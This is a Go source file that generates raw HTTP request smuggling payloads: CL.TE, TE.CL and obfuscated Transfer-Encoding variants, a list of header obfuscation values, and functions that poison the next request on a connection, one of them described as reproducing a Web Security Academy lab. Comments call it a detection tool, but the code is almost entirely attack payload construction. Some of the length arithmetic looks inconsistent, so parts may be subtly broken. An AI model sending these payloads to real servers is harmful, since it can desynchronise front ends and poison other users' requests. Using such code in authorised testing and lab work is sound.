package payload

import (
    "fmt"
    "strconv"
    "strings"
)

// Combined payloads file: consolidates CL.TE, TE.CL, Obfuscated-TE,
// advanced attacks, and the Generator helper into a single source file.

// ---------- Generator ----------
// Generator builds raw HTTP payloads for request smuggling detection.
type Generator struct {
    host    string
    port    int
    method  string
    path    string
    headers map[string]string
}

// NewGenerator creates a new payload generator for a target.
func NewGenerator(host string, port int) *Generator {
    return &Generator{
        host:    host,
        port:    port,
        method:  "GET",
        path:    "/",
        headers: make(map[string]string),
    }
}

// SetMethod sets the HTTP method for generated payloads.
func (g *Generator) SetMethod(method string) *Generator {
    g.method = method
    return g
}

// SetPath sets the request path.
func (g *Generator) SetPath(path string) *Generator {
    g.path = path
    return g
}

// AddHeader adds a custom header to the request.
func (g *Generator) AddHeader(key, value string) *Generator {
    g.headers[key] = value
    return g
}

// buildBaseRequest builds the foundation HTTP request without body manipulation.
func (g *Generator) buildBaseRequest() string {
    var buf strings.Builder

    // Request line
    buf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", g.method, g.path))

    // Host header (mandatory)
    buf.WriteString(fmt.Sprintf("Host: %s:%d\r\n", g.host, g.port))

    // Custom headers
    for key, value := range g.headers {
        buf.WriteString(fmt.Sprintf("%s: %s\r\n", key, value))
    }

    return buf.String()
}

// GenerateCLTEPayload generates a CL.TE (Content-Length / Transfer-Encoding) payload.
func (g *Generator) GenerateCLTEPayload(smoggledBody string) (string, error) {
    if smoggledBody == "" {
        return "", fmt.Errorf("smuggled body cannot be empty")
    }

    return GenerateCLTE(g.buildBaseRequest(), smoggledBody), nil
}

// GenerateTECLPayload generates a TE.CL (Transfer-Encoding / Content-Length) payload.
func (g *Generator) GenerateTECLPayload(smoggledBody string) (string, error) {
    if smoggledBody == "" {
        return "", fmt.Errorf("smuggled body cannot be empty")
    }

    return GenerateTECL(g.buildBaseRequest(), smoggledBody), nil
}

// GenerateObfuscatedTEPayload generates a CL.TE payload with obfuscated Transfer-Encoding headers.
func (g *Generator) GenerateObfuscatedTEPayload(smoggledBody string, obfuscation string) (string, error) {
    if smoggledBody == "" {
        return "", fmt.Errorf("smuggled body cannot be empty")
    }
    if obfuscation == "" {
        return "", fmt.Errorf("obfuscation value cannot be empty")
    }

    return GenerateObfuscatedTE(g.buildBaseRequest(), smoggledBody, obfuscation), nil
}

// GenerateBaseline generates a normal request with no smuggling attempt.
func (g *Generator) GenerateBaseline() string {
    var buf strings.Builder
    buf.WriteString(g.buildBaseRequest())
    buf.WriteString("Connection: close\r\n")
    buf.WriteString("\r\n")
    return buf.String()
}

// ---------- CL.TE payloads ----------

// GenerateCLTE creates a CL.TE (Content-Length / Transfer-Encoding) smuggling payload.
func GenerateCLTE(baseRequest string, smoggledBody string) string {
    var buf strings.Builder

    buf.WriteString(baseRequest)
    buf.WriteString("Transfer-Encoding: chunked\r\n")

    contentLengthValue := 4 + len("\r\n")
    buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", contentLengthValue))
    buf.WriteString("\r\n")

    buf.WriteString("5\r\n")
    buf.WriteString("0\r\n\r\n")
    buf.WriteString("0\r\n")
    buf.WriteString("\r\n")

    buf.WriteString(smoggledBody)

    return buf.String()
}

// GenerateCLTEAmbiguous creates a variant of CL.TE with intentional ambiguity.
func GenerateCLTEAmbiguous(baseRequest string, smoggledBody string) string {
    var buf strings.Builder

    buf.WriteString(baseRequest)
    buf.WriteString("Transfer-Encoding: identity\r\n")
    buf.WriteString("Transfer-Encoding: chunked\r\n")

    contentLengthValue := 4 + 4
    buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", contentLengthValue))
    buf.WriteString("\r\n")

    buf.WriteString("5\r\n")
    buf.WriteString("0\r\n\r\n")
    buf.WriteString("0\r\n\r\n")

    buf.WriteString(smoggledBody)

    return buf.String()
}

// ---------- TE.CL payloads ----------

// GenerateTECL creates a TE.CL (Transfer-Encoding / Content-Length) smuggling payload.
func GenerateTECL(baseRequest string, smoggledBody string) string {
    var buf strings.Builder

    buf.WriteString(baseRequest)

    contentLengthValue := 5
    buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", contentLengthValue))
    buf.WriteString("Transfer-Encoding: chunked\r\n")
    buf.WriteString("\r\n")

    buf.WriteString("0\r\n")
    buf.WriteString("\r\n")

    buf.WriteString(smoggledBody)

    return buf.String()
}

// GenerateTECLAmbiguous creates a variant of TE.CL with tab/space in Transfer-Encoding.
func GenerateTECLAmbiguous(baseRequest string, smoggledBody string) string {
    var buf strings.Builder

    buf.WriteString(baseRequest)
    contentLengthValue := 5
    buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", contentLengthValue))
    buf.WriteString("Transfer-Encoding:\tchunked\r\n")
    buf.WriteString("\r\n")
    buf.WriteString("0\r\n")
    buf.WriteString("\r\n")
    buf.WriteString(smoggledBody)

    return buf.String()
}

// GenerateTECLDualChunked creates TE.CL with multiple te headers to test parser ambiguity.
func GenerateTECLDualChunked(baseRequest string, smoggledBody string) string {
    var buf strings.Builder

    buf.WriteString(baseRequest)
    contentLengthValue := 5
    buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", contentLengthValue))
    buf.WriteString("Transfer-Encoding: identity\r\n")
    buf.WriteString("Transfer-Encoding: chunked\r\n")
    buf.WriteString("\r\n")
    buf.WriteString("0\r\n")
    buf.WriteString("\r\n")
    buf.WriteString(smoggledBody)

    return buf.String()
}

// ---------- Obfuscated TE payloads ----------

// GenerateObfuscatedTE creates a CL.TE payload with obfuscated Transfer-Encoding header values.
func GenerateObfuscatedTE(baseRequest string, smoggledBody string, obfuscation string) string {
    var buf strings.Builder

    buf.WriteString(baseRequest)
    buf.WriteString("Transfer-Encoding: chunked\r\n")
    buf.WriteString(fmt.Sprintf("Transfer-Encoding: %s\r\n", obfuscation))

    contentLengthValue := 4 + len("\r\n")
    buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", contentLengthValue))
    buf.WriteString("\r\n")

    buf.WriteString("5\r\n")
    buf.WriteString("0\r\n\r\n")
    buf.WriteString("0\r\n")
    buf.WriteString("\r\n")

    buf.WriteString(smoggledBody)
    return buf.String()
}

// GenerateObfuscatedTEVariant creates an obfuscated TE payload with customizable format.
func GenerateObfuscatedTEVariant(baseRequest string, smoggledBody string, teHeaders []string) string {
    var buf strings.Builder

    buf.WriteString(baseRequest)
    for _, teValue := range teHeaders {
        buf.WriteString(fmt.Sprintf("Transfer-Encoding: %s\r\n", teValue))
    }

    contentLengthValue := 4 + len("\r\n")
    buf.WriteString(fmt.Sprintf("Content-Length: %d\r\n", contentLengthValue))
    buf.WriteString("\r\n")

    buf.WriteString("5\r\n")
    buf.WriteString("0\r\n\r\n")
    buf.WriteString("0\r\n")
    buf.WriteString("\r\n")
    buf.WriteString(smoggledBody)

    return buf.String()
}

// ObfuscationPatterns defines common obfuscation patterns for Transfer-Encoding
var ObfuscationPatterns = []string{
    "cow",
    "x-chunked",
    "chunked;q=0.5",
    "zip",
    "deflate",
    "x-gzip",
    "identity",
    "*",
}

// ---------- Advanced attacks (GPOST / poisoning) ----------

// CL_TE_GPOST_ATTACK generates the exact Web Security Academy lab attack payload.
func CL_TE_GPOST_ATTACK(host string, port int) string {
    return "POST / HTTP/1.1\r\n" +
        "Host: " + host + ":" + strconv.Itoa(port) + "\r\n" +
        "Connection: keep-alive\r\n" +
        "Content-Type: application/x-www-form-urlencoded\r\n" +
        "Content-Length: 6\r\n" +
        "Transfer-Encoding: chunked\r\n" +
        "\r\n" +
        "0\r\n" +
        "\r\n" +
        "G"
}

// ProbeRequestAfterPoison sends a simple GET request after smuggling.
func ProbeRequestAfterPoison(host string, port int) string {
    return "GET / HTTP/1.1\r\n" +
        "Host: " + host + ":" + strconv.Itoa(port) + "\r\n" +
        "Connection: close\r\n" +
        "\r\n"
}

// HTTP1_CL_TE_Poison generates a CL.TE attack that poisons the next request.
func HTTP1_CL_TE_Poison(host string, port int, poisonChar string) string {
    poisonLen := len(poisonChar) + 5
    clValue := strconv.Itoa(poisonLen)
    return "POST / HTTP/1.1\r\n" +
        "Host: " + host + ":" + strconv.Itoa(port) + "\r\n" +
        "Connection: keep-alive\r\n" +
        "Content-Length: " + clValue + "\r\n" +
        "Transfer-Encoding: chunked\r\n" +
        "\r\n" +
        "0\r\n" +
        "\r\n" +
        poisonChar
}
